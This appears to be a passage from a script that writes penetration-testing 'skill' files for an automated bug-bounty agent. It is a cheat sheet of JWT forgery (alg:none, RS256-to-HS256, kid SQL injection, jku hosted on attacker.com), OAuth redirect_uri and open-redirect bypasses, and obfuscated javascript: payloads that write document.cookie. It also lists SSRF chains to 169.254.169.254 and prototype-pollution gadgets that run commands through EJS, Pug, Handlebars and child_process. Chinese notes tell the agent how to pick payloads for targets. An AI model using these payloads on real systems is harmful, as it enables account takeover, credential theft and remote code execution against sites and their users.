eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
### → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
### → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
### Burp JWT Editor / python-jwt attack:
### Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

### Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
### OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
### → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
### Step 1: Obtain public key (PEM format)
### From: /api/.well-known/jwks.json → convert to PEM
### From: /certs endpoint
### From: OpenSSL extraction from HTTPS cert

### Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

### Step 3: Manually:
### Modify header: {"alg":"HS256","typ":"JWT"}
### Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
### hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

### john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

### jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
### Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

### Create JWKS:
python3 -c "
import json, base64, struct
### ... (use python-jwcrypto or jwt_tool to export JWKS)
"

### Host malicious JWKS at attacker.com/malicious-jwks.json
### Sign JWT with attacker's private key
### Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ 用户给的会话禁止调 logout，不测「退出后会话还在」。自己注册/匿名建的测试号可以测退出后票是否失效
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```

---

## 补充：oauth-oidc-misconfiguration

### oauth-oidc-misconfiguration

### OAuth and OIDC Misconfiguration — Redirects, PKCE, Scopes, and Token Binding

## 1. WHEN TO LOAD THIS SKILL

Load when:

- The app supports `Login with Google`, GitHub, Microsoft, Okta, or other IdPs
- You see `authorize`, `callback`, `redirect_uri`, `code`, `state`, `nonce`, or `code_challenge`
- Mobile or SPA clients rely on OAuth or OIDC flows

For token cryptography and JWT header abuse, also load:

- [jwt oauth token attacks](oauth-jwt-test.md)

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| `state` handling | missing, static, predictable, or not bound to user session |
| `redirect_uri` validation | prefix match, open redirect chaining, path confusion, localhost leftovers |
| PKCE | missing for public clients, code verifier not enforced, downgraded flow |
| OIDC `nonce` | missing or not validated on ID token return |
| token audience and issuer | weak `aud` / `iss` checks, cross-client token reuse |
| account binding | callback binds attacker identity to victim session |
| scope handling | broader scopes granted than the user or client should receive |

## 3. QUICK TRIAGE

1. Map the full flow: authorize, callback, token exchange。用户给的会话不要测登出。
2. Replay callback flows with altered `state`, `nonce`, and `redirect_uri`.
3. Compare SPA, mobile, and web clients for weaker validation.
4. Check whether one provider account can be rebound to another local account.

## 4. RELATED ROUTES

- 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`
- XML federation or enterprise SSO: [saml sso assertion attacks](oauth-jwt-test.md)
- CSRF-heavy login or binding bugs: [csrf cross site request forgery](csrf-test.md)

---

## 补充：saml-sso-assertion-attacks

### saml-sso-assertion-attacks

### SAML SSO and Assertion Attacks — Signature Validation, Binding, and Trust Confusion

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Enterprise SSO uses SAML requests or responses
- You see `SAMLRequest`, `SAMLResponse`, XML assertions, or ACS endpoints
- Login flows involve an external IdP and browser POST/redirect binding

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| signature validation | unsigned assertion accepted, wrong node signed, signature wrapping |
| audience and recipient | weak `Audience`, `Recipient`, `Destination`, or ACS validation |
| issuer trust | wrong IdP accepted or multi-tenant issuer confusion |
| replay and freshness | missing `InResponseTo`, weak `NotBefore` / `NotOnOrAfter` enforcement |
| account mapping | email-only binding, case folding, unverified attributes |
| XML parser behavior | XXE-like parser issues or unsafe transforms around SAML documents |

## 3. QUICK TRIAGE

1. Capture one full login round trip.
2. Inspect which XML nodes are signed and which attributes drive account binding.
3. Compare SP-initiated and IdP-initiated flows.
4. Test replay, altered attributes, and assertion placement confusion.

## 4. RELATED ROUTES

- XML parser attack depth: [xxe xml external entity](xxe-test.md)
- OAuth or OIDC SSO alternatives: [oauth oidc misconfiguration](oauth-jwt-test.md)
- Auth boundary issues after SSO: [authbypass authentication flaws](authbypass-test.md)
TECH_OAUTH_JWT_TEST_EOF

seed_rule techniques/open-redirect-test.md <<'TECH_OPEN_REDIRECT_TEST_EOF'
# open-redirect

# Open Redirect

## 1. CORE CONCEPT

Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain acts as a "launchpad" for phishing or token theft.

```
https://trusted.com/redirect?url=https://evil.com
→ User sees trusted.com in the link → clicks → lands on evil.com
```

---

## 2. FINDING REDIRECT PARAMETERS

### Common Parameter Names

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=     ?backUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### Server-Side Sinks

```
HTTP 301/302 Location header
PHP: header("Location: $input")
Python: redirect(input)
Java: response.sendRedirect(input)
Node: res.redirect(input)
```

### Client-Side (JavaScript) Sinks

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

---

## 3. FILTER BYPASS TECHNIQUES

| Validation | Bypass |
|---|---|
| Checks if URL starts with `/` | `//evil.com` (protocol-relative) |
| Checks domain contains `trusted.com` | `evil.com?trusted.com` or `trusted.com.evil.com` |
| Blocks `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| Checks URL starts with `https://trusted.com` | `https://trusted.com@evil.com` (userinfo) |
| Regex `^/[^/]` (relative only) | `/\evil.com` (backslash treated as path in some browsers) |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` — URL path ends with target domain |
| Whitelist by domain suffix | Subdomain takeover on `*.trusted.com` |

```text
# Protocol-relative:
//evil.com

# Userinfo bypass:
https://trusted.com@evil.com

# Backslash trick:
/\evil.com
/\/evil.com

# URL encoding:
https://trusted.com/%2F%2Fevil.com

# Django endswith bypass:
http://evil.com/www.target.com
http://evil.com?target.com

# Trusted site double-redirect (e.g., via Baidu link service):
https://link.target.com/?url=http://evil.com

# Special character confusion:
http://evil.com#@trusted.com        # fragment as authority
http://evil.com?trusted.com         # query string confusion
http://trusted.com%00@evil.com      # null byte truncation

# Tab/newline/CR in URL (browser ignores whitespace, 拆开字面 javascript:):
java%09script:alert(1)
java%0dscript:window[`ev`%2b`al`](window[`at`%2b`ob`](`ZG9jdW1lbnQud3JpdGUoYWxlcnQoMSkp`))
java%0dscript:window[`ale`%2b`rt`](1)
# %0d/%0a/%09 都能拆；%2b 是 +；反引号拼任意关键字（ev+al / at+ob / ale+rt）。先用拼 alert 探协议通不通；打 SRC 换 document.write(document.cookie) 或它的 Base64
```

---

## 4. EXPLOITATION CHAINS

### Phishing Amplification

Attacker sends: `https://bigbank.com/redirect?url=https://bigbank-login.evil.com`
Victim sees `bigbank.com` → clicks → enters credentials on clone site.

### OAuth Token Theft

If OAuth `redirect_uri` allows open redirect on the authorized domain:
```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ Authorization code or token appended to evil.com URL
→ Attacker captures token from URL fragment or query
```

### CSRF Referer Bypass

Some CSRF protections check `Referer` header contains trusted domain:
```
1. Attacker page links to: https://trusted.com/redirect?url=https://trusted.com/change-email
2. Redirect preserves Referer from trusted.com
3. CSRF protection passes because Referer = trusted.com
```

### SSRF via Redirect

When server follows redirects:
```
?url=https://attacker.com/redirect-to-internal
# attacker.com returns 302 → http://169.254.169.254/
# Server follows redirect → SSRF to metadata endpoint
```

---

## 5. TESTING CHECKLIST

```
□ Identify all URL parameters that trigger redirects
□ Test external domain: ?url=https://evil.com
□ Test protocol-relative: ?url=//evil.com
□ Test userinfo bypass: ?url=https://trusted.com@evil.com
□ Test backslash: ?url=/\evil.com
□ Test JavaScript sink: ?url=javascript:alert(1) / ?backUrl=javascript%3Adocument.write(document.cookie)
  （字面 javascript: 被拦时冒号改 %3A。证明用 document.write(document.cookie)，别只 alert(1)。
  前端 location.href / <a href> 才执行；HTTP 302 的 Location 写 javascript: 浏览器通常不跑，那只是开放跳转不是 XSS）
□ Check OAuth flows for redirect_uri open redirect
□ Verify if redirect preserves auth tokens in URL
```

---

## 6. TABNABBING (REVERSE TABNABBING)

### Concept

When a link opens a new tab with `target="_blank"` WITHOUT `rel="noopener"`:

- The new page can access `window.opener`
- It can redirect the ORIGINAL page: `window.opener.location = "https://phishing.com/login"`
- User returns to "original" tab → sees fake login page → enters credentials

### Detection

```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click here</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click here</a>
```

### Exploitation

```javascript
// On the attacker-controlled page (opened via target="_blank"):
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

### Where to Look

- User-generated content with links (forums, comments, profiles)
- `target="_blank"` links to external domains
- PDF viewers, document previews opening in new tabs

---

## 7. OPEN REDIRECT → OAUTH TOKEN THEFT (DETAILED CHAINS)

### 7.1 OAuth Implicit Flow

In the implicit flow, the access token is returned in the URL fragment (`#access_token=...`). If `redirect_uri` allows an open redirect on the authorized domain:

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read

Flow:
1. User authenticates → authorization server redirects to:
   https://target.com/redirect?url=https://evil.com#access_token=SECRET
2. Open redirect fires → browser navigates to:
   https://evil.com#access_token=SECRET
3. Attacker page reads location.hash → captures access token
```

### 7.2 Authorization Code Flow

The authorization code is sent as a query parameter. If the redirect chain preserves query parameters:

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com

Flow:
1. Authorization server validates redirect_uri prefix → matches https://target.com/
2. Redirects to: https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
3. Open redirect sends victim to: https://evil.com?code=AUTH_CODE
4. Attacker exchanges code for access token
```

### 7.3 OIDC id_token Fragment Leak

```text
/authorize?response_type=id_token
  &client_id=CLIENT
  &redirect_uri=https://target.com/cb
  &nonce=NONCE

If redirect_uri points to open redirect endpoint:
→ id_token in fragment sent to attacker
→ Attacker has signed identity assertion
→ Can authenticate as victim on any RP accepting this IdP
```

### 7.4 redirect_uri validation bypass patterns

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

---

## 8. OPEN REDIRECT → SSRF CHAIN

### Server-side redirect following

When a server-side component follows HTTP redirects (e.g., URL preview, link unfurler, webhook, image fetcher):

```text
1. Submit URL to server-side fetcher: http://attacker.com/redirect
2. attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/
3. Server follows redirect → SSRF to cloud metadata endpoint
4. Response (IAM credentials) returned to attacker or visible in preview
```

### Multi-hop redirect for filter bypass

```text
1. Server blocks direct requests to 169.254.169.254
2. Submit: http://attacker.com/r1
3. r1 → 302 → http://attacker.com/r2  (same domain, passes filter)
4. r2 → 302 → http://169.254.169.254/ (internal, filter not re-checked)
```

### DNS rebinding variant

```text
1. attacker.com resolves to attacker's public IP (TTL=0)
2. Server resolves attacker.com → public IP → passes SSRF filter
3. Connection established, but HTTP redirect points to attacker.com again
4. Second DNS resolution: attacker.com now resolves to 169.254.169.254
5. Server follows redirect to internal address
```

### Scope escalation via redirect protocols

```text
http://attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis SSRF)
http://attacker.com/redirect → file:///etc/passwd            (local file read)
http://attacker.com/redirect → dict://127.0.0.1:11211/       (Memcached)
```

Not all HTTP clients follow cross-protocol redirects, but `curl` (default) and some libraries do.

---

## 9. URL PARSER CONFUSION FOR REDIRECT BYPASS

When a redirect validation function parses the URL differently from the browser or server that ultimately processes it:

### Protocol-relative URL

```text
//attacker.com
→ Browser: https://attacker.com (inherits current page protocol)
→ Some validators: relative path "/attacker.com" (wrong)
```

### Backslash confusion

```text
\/\/attacker.com
/\/attacker.com
→ Many browsers normalize \ to / in URLs
→ Validators treating \ as path character may allow it
```

### Userinfo section abuse

```text
//attacker.com\@target.com
→ Browser: navigates to attacker.com (@ is userinfo delimiter)
→ Validator sees "target.com" in the string → passes allowlist check

//target.com@attacker.com
→ Browser: userinfo=target.com, host=attacker.com
→ Validator checks "starts with target.com" → passes

https://target.com%2F@attacker.com
→ URL-decoded: target.com/ as userinfo, host=attacker.com
```

### Double encoding

```text
//attacker%252ecom
→ First decode: //attacker%2ecom (passes validator)
→ Second decode (by server/browser): //attacker.com (actual redirect)
```

### CRLF injection + redirect

```text
/%0d%0aLocation:%20https://attacker.com
→ If server reflects the path in a header context:
   HTTP/1.1 302 Found
   Location: /
   Location: https://attacker.com  ← injected header wins
```

### Fragment confusion

```text
https://target.com#@attacker.com
→ Browser: host=target.com, fragment=@attacker.com
→ But some JS-based redirects: window.location = url → may process differently

https://attacker.com#.target.com
→ Validator: sees "target.com" in string → passes
→ Browser: navigates to attacker.com (fragment ignored in navigation)
```

### Special characters

```text
https://attacker.com%E3%80%82target.com
→ Unicode ideographic full stop (U+3002) — some parsers treat as dot
→ Browser may normalize differently than validator

https://attacker。com    (U+3002 fullwidth period)
https://attacker．com    (U+FF0E fullwidth full stop)
```

### Combined URL parser differential table

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | Relative path | `https://evil.com` |
| `\/\/evil.com` | Path `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | Contains `target.com` | `https://evil.com` |
| `//target.com@evil.com` | Starts with `target.com` | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | Path string | Header injection → redirect |
| `//evil%252ecom` | `evil%2ecom` (not a domain) | `evil.com` (after double decode) |
TECH_OPEN_REDIRECT_TEST_EOF

seed_rule techniques/prototype-pollution-test.md <<'TECH_PROTOTYPE_POLLUTION_TEST_EOF'
> 短表「PP 打到模板 RCE」在后半「来源专题：prototype-pollution-advanced」下，用标题搜即可。主场是 Node 深合并；别的栈 JSON 也能合就仍可探一枪，gadget 对不上丢掉，不是禁打。

# prototype-pollution


# 来源专题：prototype-pollution

# Prototype Pollution

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).

### Quick boolean

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.

---

## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.

**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If router or analytics code parses fragments into objects and then merges, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / attribute injection ideas

If the framework merges attribute names as object keys:

```text
__proto__[src]=//evil/xss.js
```

Event-handler style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |

**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.

---

## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |

**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---

## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
| **msrkp/PPScan** | Scanning/verification helper |

Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.

---

## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---


# 来源专题：prototype-pollution-advanced

# Prototype Pollution Advanced — RCE & Gadget Exploitation

### PP 打到模板 RCE（短表有指针）

认：Node / Express；JSON 或 query 能把 `__proto__` / `constructor.prototype` 写进去（先用 `{"__proto__":{"pptest123":"1"}}`，干净请求还看得到副作用）；后面有 `res.render`、EJS、Pug、Handlebars，或会 `child_process.spawn`。

打：

1. 污染通了再打 gadget，不要一上来喷 RCE 串。
2. EJS：`outputFunctionName` 注入；Pug：`block.type` + `val`；拦 `__proto__` 就换 `constructor.prototype`。
3. 没有模板再试 `shell` + `NODE_OPTIONS`。命令用 `echo 标记 && id`，不要反弹。

算成：下一次模板渲染或 spawn 后，回包/日志出现指定标记或 `uid=`。只污染成功、命令没跑 → 还没成。

假点：只能改前端展示；没有模板/spawn gadget；污染一请求就没了、下一次 render 不跟。单站没中不删短表这行。Node 深合并优先开 gadget；别的栈合得进也可以探，对不上丢掉。

gadget 表和 payload 见下面英文段 + 附件 KNOWN_GADGETS。

## 1. SERVER-SIDE PP → RCE

### 1.1 Node.js child_process.spawn — Shell/ENV Injection

When `child_process.spawn` or `child_process.fork` is called without explicit `env`/`shell` options, it inherits from `Object.prototype`:

```javascript
// Vulnerable pattern (very common):
const { execSync } = require('child_process');
execSync('ls');  // inherits shell, env from prototype

// Pollution for RCE:
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
// Next child_process call executes attacker code
```

Alternative ENV pollution:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

### 1.2 EJS (Embedded JavaScript Templates)

EJS `render()` reads `opts` from object properties. Polluting `outputFunctionName` injects code into the compiled template function:

```json
// Pollution payload:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// When EJS renders ANY template after pollution:
// Compiled function includes: var x;process.mainModule.require('child_process').execSync('id');s = "";
// → RCE
```

Detection: any EJS `res.render()` call after pollution triggers it.

### 1.3 Pug (formerly Jade)

Pug's compiler reads `block` from object properties:

```json
{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

Alternative via `self` option:

```json
{"__proto__": {"self": true, "line": "x]});process.mainModule.require('child_process').execSync('id');//"}}
```

### 1.4 Handlebars

Handlebars template compilation checks `type` and `program` on template AST nodes:

```json
{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": {"type": "PathExpression", "original": "constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts": ["constructor","constructor"]}, "params": [], "hash": null}]}}
```

Simpler via `allowProtoMethodsByDefault`:

```json
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
// Then use {{#with this as |obj|}}{{obj.constructor.constructor "return process.mainModule.require('child_process').execSync('id')"}}{{/with}}
```

### 1.5 Nunjucks

```json
{"__proto__": {"type": "Code", "value": "global.process.mainModule.require('child_process').execSync('id')"}}
```

### 1.6 Express res.render (Generic)

When Express calls `res.render()`, options merge with `app.locals` and `res.locals`. Polluted prototype properties appear as template variables:

```json
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

---

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.

After pollution, jQuery's HTML methods use polluted properties:

```javascript
// Pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
$('<div>').appendTo('body');  // may use polluted property
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
